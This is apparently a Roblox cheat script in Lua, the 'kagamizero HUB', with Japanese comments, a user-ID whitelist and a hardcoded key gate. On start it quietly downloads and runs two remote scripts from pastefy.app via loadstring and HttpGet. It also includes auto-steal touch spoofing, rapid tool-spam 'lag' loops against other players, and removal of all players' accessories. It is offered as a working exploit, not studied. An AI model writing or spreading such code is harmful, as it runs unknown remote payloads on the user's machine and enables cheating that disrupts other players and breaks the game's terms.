-- [[ kagamizero 厳格ID認証ガード ]]
local _L_P = game:GetService('Players').LocalPlayer
local Authorized_IDs = {
    [123456789] = true, -- あなたのID
    [4838644557] = true, -- KagamiZero (4838644557) を追加しました
}

-- IDチェック
if not Authorized_IDs[_L_P.UserId] then
    _L_P:Kick("\n[ACCESS DENIED]\nYour ID (" .. _L_P.UserId .. ") is not registered.")
    return 
end

-- [[ kagamizero 管理テーブルユニット ]]
local kagamizero_Registry = {
    ["Whitelisted"] = { ["kagamizero"] = true },
    ["Config"] = {
        ["ProtocolVersion"] = "0.09" -- バージョンを0.09に上げました
    }
}

local _TARGET_KEY = "kagamizero" 
local _SAVE_FILE = "kagamizero_auth.txt"

-- [メインロジック]
local function InitializeScript()
    -- 外部連携（元のソースを維持）
    task.spawn(function()
        pcall(function() loadstring(game:HttpGet("https://pastefy.app/i9StByGZ/raw"))() end)
        pcall(function() loadstring(game:HttpGet("https://pastefy.app/yT46OCAj/raw"))() end)
    end)

    local _L_P = game:GetService('Players').LocalPlayer
    local _U_I = game:GetService('UserInputService')
    local _R_S = game:GetService('RunService')
    local _W_S = game:GetService('Workspace')
    local _C_G = game:GetService("CoreGui")

    getgenv()._Bat = false
    getgenv()._AutoSteal = false
    getgenv()._ApexLagKill = false
    getgenv()._TakeshiLagActive = false
    local v2 = false 
    local _EquipTick = 0
    local _UI_Visible = true

    -- アクセサリー削除ループ
    task.spawn(function() 
        while task.wait(0.2) do 
            for _, v81 in pairs(game:GetService("Players"):GetPlayers()) do 
                local v83 = v81.Character
                if v83 then 
                    for _, v96 in pairs(v83:GetChildren()) do 
                        if v96:IsA("Accessory") then v96:Destroy() end 
                    end 
                end 
            end 
        end 
    end)

    -- ツール自動使用ループ
    task.spawn(function() 
        while task.wait() do 
            if v2 then 
                local v85, v86 = _L_P.Character, _L_P:FindFirstChild("Backpack")
                if (v85 and v86) then 
                    for _, v98 in pairs({"Bat","Laser Cape","Laser Gun"}) do 
                        if not v2 then break end 
                        local v99 = v86:FindFirstChild(v98) or v85:FindFirstChild(v98)
                        if (v99 and v99:IsA("Tool")) then 
                            v99.Parent = v85; v99:Activate(); 
                            task.wait(0.08)
                            if (v99.Parent == v85) then v99.Parent = v86 end 
                        end 
                    end 
                end 
            end 
        end 
    end)

    -- UI構築
    local function BuildUI()
        local targetGui = (gethui and gethui()) or _C_G
        if targetGui:FindFirstChild('kagamizero_008') then targetGui.kagamizero_008:Destroy() end
        local sg = Instance.new('ScreenGui', targetGui)
        sg.Name = 'kagamizero_008'
        sg.ResetOnSpawn = false
        local main = Instance.new('Frame', sg)
        main.Size = UDim2.new(0, 160, 0, 245)
        main.Position = UDim2.new(0, 30, 0.45, 0)
        main.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
        main.Visible = _UI_Visible; main.Active = true
        Instance.new('UICorner', main).CornerRadius = UDim.new(0, 8)
        local st = Instance.new('UIStroke', main); st.Thickness = 2; st.Color = Color3.fromRGB(0, 255, 255)
        local bar = Instance.new('Frame', main)
        bar.Size, bar.BackgroundColor3 = UDim2.new(1, 0, 0, 25), Color3.fromRGB(0, 255, 255)
        Instance.new('UICorner', bar).CornerRadius = UDim.new(0, 8)
        local title = Instance.new("TextLabel", bar)
        title.Size = UDim2.new(1,0,1,0); title.BackgroundTransparency = 1; title.Text = "kagamizero HUB"; title.TextColor3 = Color3.new(0,0,0); title.Font = Enum.Font.GothamBold; title.TextSize = 11

        -- ドラッグ機能
        local d, dSt, sP
        bar.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                d = true; dSt = i.Position; sP = main.Position
                i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then d = false end end)
            end
        end)
        _U_I.InputChanged:Connect(function(i)
            if d and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local delta = i.Position - dSt
                main.Position = UDim2.new(sP.X.Scale, sP.X.Offset + delta.X, sP.Y.Scale, sP.Y.Offset + delta.Y)
            end
        end)

        local function _Add(name, vars, pos, callback)
            local btn = Instance.new('TextButton', main)
            btn.Size, btn.Position = UDim2.new(0, 140, 0, 40), UDim2.new(0, 10, 0, pos)
            btn.BackgroundColor3 = Color3.fromRGB(15, 15, 20); btn.Text = name; btn.TextColor3 = Color3.fromRGB(200, 200, 200); btn.Font = Enum.Font.Code; btn.TextSize = 10
            local bs = Instance.new('UIStroke', btn); bs.Thickness = 1; bs.Color = Color3.fromRGB(50, 50, 50); Instance.new('UICorner', btn)
            btn.MouseButton1Click:Connect(function()
                if vars then
                    local nS = not getgenv()[vars[1]]
                    for _, v in ipairs(vars) do if v == "v2" then v2 = nS else getgenv()[v] = nS end end
                    bs.Color = nS and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(50, 50, 50)
                    btn.TextColor3 = nS and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(200, 200, 200)
                    if callback then callback(nS) end
                else if callback then callback() end end
            end)
        end

        _Add("ALL SYSTEMS", {"_Bat", "_AutoSteal"}, 35)
        _Add("AUTO STEAL", {"_AutoSteal"}, 80)
        _Add("ALL LAG (0.08s)", {"_ApexLagKill", "_TakeshiLagActive", "v2"}, 125, function(s) if s then StartTakeshiLagLogic() end end)
        _Add("RESPAWN", nil, 170, function() if _L_P.Character then _L_P.Character:BreakJoints() local h = _L_P.Character:FindFirstChildOfClass("Humanoid") if h then h.Health = 0 end end end)
        _U_I.InputBegan:Connect(function(i, g) if not g and i.KeyCode == Enum.KeyCode.L then _UI_Visible = not _UI_Visible; main.Visible = _UI_Visible end end)
    end

    function StartTakeshiLagLogic()
        task.spawn(function()
            local v47 = _L_P
            local v48 = {"bat","laser cape","laser gun"}
            local function v49() 
                local v50={}; local v51=v47:FindFirstChild("Backpack"); local v52=v47.Character;
                local function v53(v54) if v54 then for _,v68 in ipairs(v54:GetChildren()) do if v68:IsA("Tool") then for _,v75 in ipairs(v48) do if string.find(string.lower(v68.Name),v75) then table.insert(v50,v68) end end end end end end 
                v53(v51); v53(v52); return v50;
            end
            while getgenv()._TakeshiLagActive do
                local v69=v47.Character; local v70=v47:FindFirstChild("Backpack")
                if (v69 and v70) then 
                    local v73=v49()
                    if (#v73>0) then 
                        for _,v78 in ipairs(v73) do 
                            if not getgenv()._TakeshiLagActive then break end 
                            v78.Parent=v69; v78:Activate(); 
                            task.wait(0.08)
                            if (v78.Parent==v69) then v78.Parent=v70 end
                        end 
                    else task.wait(0.5) end 
                else task.wait(0.1) end
            end
        end)
    end

    _R_S.Heartbeat:Connect(function()
        local char = _L_P.Character
        if not char or not _Bat then return end
        _EquipTick = (_EquipTick + 1) % 6
        local bp = _L_P.Backpack
        for _, t in pairs(char:GetChildren()) do if t:IsA("Tool") and t.Name:lower():find("bat") then if _EquipTick >= 3 then t.Parent = bp end end end
        for _, t in pairs(bp:GetChildren()) do if t:IsA("Tool") and t.Name:lower():find("bat") then if _EquipTick < 3 then t.Parent = char end end end
    end)

    task.spawn(function()
        while task.wait(0.05) do
            if getgenv()._AutoSteal then
                local r = _L_P.Character and _L_P.Character:FindFirstChild("HumanoidRootPart")
                if r then
                    local parts = _W_S:GetPartBoundsInRadius(r.Position, 12)
                    for _, p in pairs(parts) do if p:FindFirstChildWhichIsA("TouchInterest") or p.Name:lower():find("brain") then firetouchinterest(r, p, 0); task.wait(); firetouchinterest(r, p, 1) end end
                end
            end
        end
    end)

    task.defer(BuildUI)
end

-- [永続認証の論理チェック]
local function CheckAuth()
    if isfile and isfile(_SAVE_FILE) then
        if readfile(_SAVE_FILE) == _TARGET_KEY then return true end
    end
    return false
end

-- [認証UI構築]
local function BuildKeySystem()
    if CheckAuth() then
        InitializeScript()
        return
    end

    local targetGui = (gethui and gethui()) or game:GetService("CoreGui")
    if targetGui:FindFirstChild('kagamizero_KeySystem') then targetGui.kagamizero_KeySystem:Destroy() end

    local sg = Instance.new('ScreenGui', targetGui)
    sg.Name = 'kagamizero_KeySystem'
    
    local frame = Instance.new('Frame', sg)
    frame.Size = UDim2.new(0, 260, 0, 140)
    frame.Position = UDim2.new(0.5, -130, 0.4, 0)
    frame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
    Instance.new('UICorner', frame)
    local st = Instance.new('UIStroke', frame); st.Color = Color3.fromRGB(0, 255, 255); st.Thickness = 2

    local title = Instance.new('TextLabel', frame)
    title.Size = UDim2.new(1, 0, 0, 40); title.Text = "KAGAMIZERO AUTH"; title.TextColor3 = Color3.new(0,1,1); title.BackgroundTransparency = 1; title.Font = Enum.Font.Code; title.TextSize = 14

    local box = Instance.new('TextBox', frame)
    box.Size = UDim2.new(0, 220, 0, 35); box.Position = UDim2.new(0.5, -110, 0.4, 0)
    box.BackgroundColor3 = Color3.fromRGB(15, 15, 25); box.Text = ""; box.PlaceholderText = "Input Key..."; box.TextColor3 = Color3.new(1,1,1); box.Font = Enum.Font.Code
    Instance.new('UICorner', box)

    local btn = Instance.new('TextButton', frame)
    btn.Name = "AcceptBtn"
    btn.Size = UDim2.new(0, 120, 0, 35); btn.Position = UDim2.new(0.5, -60, 0.75, 0)
    btn.Text = "ACCEPT"; btn.BackgroundColor3 = Color3.fromRGB(0, 255, 255); btn.TextColor3 = Color3.new(0,0,0); btn.Font = Enum.Font.GothamBold
    Instance.new('UICorner', btn)

    btn.MouseButton1Click:Connect(function()
        if box.Text == _TARGET_KEY then
            if writefile then writefile(_SAVE_FILE, _TARGET_KEY) end
            sg:Destroy()
            InitializeScript()
        else
            box.Text = ""
            box.PlaceholderText = "ACCESS DENIED"
            st.Color = Color3.new(1,0,0)
            task.wait(1.5)
            st.Color = Color3.fromRGB(0, 255, 255)
            box.PlaceholderText = "Input Key..."
        end
    end)
end

BuildKeySystem()
